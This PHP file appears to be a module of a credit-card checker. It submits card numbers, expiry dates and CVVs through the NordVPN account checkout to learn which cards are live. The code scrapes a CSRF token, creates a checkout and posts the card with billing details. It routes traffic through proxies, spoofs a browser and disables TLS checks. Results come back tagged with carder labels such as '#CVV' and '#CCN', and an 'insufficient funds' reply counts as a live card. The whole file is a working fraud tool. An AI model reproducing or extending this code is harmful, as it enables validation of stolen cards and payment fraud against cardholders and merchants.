<?php
/**
 * NordVPN Gateway Handler
 * Validates cards against NordVPN's payment system
 */

// Check a card with NordVPN gateway
function checkCardWithNordVPN($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig) {
    // Start timing
    $start_time = microtime(true);
    
    // Format month for NordVPN (requires 2 digits)
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    
    // Initialize cURL
    $ch = curl_init();
    
    // Set proxy if configured
    if (!empty($proxyConfig)) {
        configureCurlWithProxy($ch, $proxyConfig);
    }
    
    // Common cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    
    // User agent and other headers
    $user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    
    // Service ID (plan ID) and token from user input or default
    $service_id = !empty($apiKey) ? $apiKey : '92';  // Default to 1-month plan
    $token = !empty($secretKey) ? $secretKey : '';   // Empty default
    
    // First request - Get CSRF token and session
    curl_setopt($ch, CURLOPT_URL, "https://my.nordaccount.com/checkout/entry-point/");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: $user_agent",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
    ]);
    
    $response = curl_exec($ch);
    
    if (!$response || curl_errno($ch)) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ NordVPN Connection Error | Time: " . $time_taken . "s ]";
    }
    
    // Extract CSRF token
    $csrf_token = '';
    if (preg_match('/"csrfToken":"([^"]+)"/', $response, $matches)) {
        $csrf_token = $matches[1];
    } else {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ NordVPN: Failed to get CSRF token | Time: " . $time_taken . "s ]";
    }
    
    // Second request - Add product to checkout
    $checkout_data = [
        'service_id' => $service_id,
        'csrf_token' => $csrf_token
    ];
    
    if (!empty($token)) {
        $checkout_data['token'] = $token;
    }
    
    curl_setopt($ch, CURLOPT_URL, "https://my.nordaccount.com/checkout/nordvpn/create-checkout/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: $user_agent",
        "Accept: application/json",
        "Accept-Language: en-US,en;q=0.5",
        "Content-Type: application/json",
        "X-CSRF-TOKEN: $csrf_token"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($checkout_data));
    
    $checkout_response = curl_exec($ch);
    
    if (!$checkout_response || curl_errno($ch)) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ NordVPN Checkout Error | Time: " . $time_taken . "s ]";
    }
    
    $checkout_data = json_decode($checkout_response, true);
    
    if (!isset($checkout_data['checkout_id'])) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        $error_msg = isset($checkout_data['message']) ? $checkout_data['message'] : 'Failed to create checkout';
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ NordVPN: $error_msg | Time: " . $time_taken . "s ]";
    }
    
    $checkout_id = $checkout_data['checkout_id'];
    
    // Third request - Add payment details
    $card_data = [
        'checkout_id' => $checkout_id,
        'payment_method_id' => 'credit_card',
        'data' => [
            'name' => $user_data['name'],
            'number' => $cc,
            'cvc' => $cvv,
            'exp_month' => intval($mes),
            'exp_year' => intval($ano),
            'address' => [
                'first_name' => $user_data['first_name'],
                'last_name' => $user_data['last_name'],
                'country_code' => 'US',
                'state' => $user_data['state'],
                'city' => $user_data['city'],
                'address' => $user_data['street'],
                'zip_code' => $user_data['postcode'],
                'email' => $user_data['email']
            ]
        ],
        'csrf_token' => $csrf_token
    ];
    
    curl_setopt($ch, CURLOPT_URL, "https://my.nordaccount.com/checkout/payment-method/");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: $user_agent",
        "Accept: application/json",
        "Accept-Language: en-US,en;q=0.5",
        "Content-Type: application/json",
        "X-CSRF-TOKEN: $csrf_token"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($card_data));
    
    $payment_response = curl_exec($ch);
    curl_close($ch);
    
    // Calculate time taken
    $time_taken = number_format(microtime(true) - $start_time, 2);
    
    // Format bin info for display
    $bin_info_formatted = formatBinInfo($bin_data);
    
    // Process response
    if (!$payment_response) {
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ NordVPN Payment Error | Time: " . $time_taken . "s ]";
    }
    
    $payment_data = json_decode($payment_response, true);
    
    if (isset($payment_data['success']) && $payment_data['success'] === true) {
        // Successfully added payment method
        return "✅ #CVV - $cc|$mes|$ano|$cvv - [ NordVPN: Payment Approved | $bin_info_formatted | Time: " . $time_taken . "s ]";
    } elseif (isset($payment_data['errors'])) {
        // Payment errors
        $error_msg = '';
        
        // Extract all error messages
        foreach ($payment_data['errors'] as $field => $errors) {
            if (is_array($errors)) {
                foreach ($errors as $error) {
                    $error_msg .= $error . ' ';
                }
            } else {
                $error_msg .= $errors . ' ';
            }
        }
        
        // Categorize errors
        if (strpos(strtolower($error_msg), 'cvc') !== false || strpos(strtolower($error_msg), 'cvv') !== false) {
            return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ NordVPN: CVC/CVV Issue | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } elseif (strpos(strtolower($error_msg), 'funds') !== false || strpos(strtolower($error_msg), 'insufficient') !== false) {
            return "✅ #CVV - $cc|$mes|$ano|$cvv - [ NordVPN: Insufficient Funds | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } elseif (strpos(strtolower($error_msg), 'card number') !== false || strpos(strtolower($error_msg), 'invalid number') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ NordVPN: Invalid Card Number | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } elseif (strpos(strtolower($error_msg), 'expiration') !== false || strpos(strtolower($error_msg), 'expired') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ NordVPN: Card Expired | $bin_info_formatted | Time: " . $time_taken . "s ]";
        } else {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ NordVPN: $error_msg | $bin_info_formatted | Time: " . $time_taken . "s ]";
        }
    } else {
        // Unexpected response
        $error_msg = isset($payment_data['message']) ? $payment_data['message'] : 'Unknown error';
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ NordVPN: $error_msg | Time: " . $time_taken . "s ]";
    }
}
?>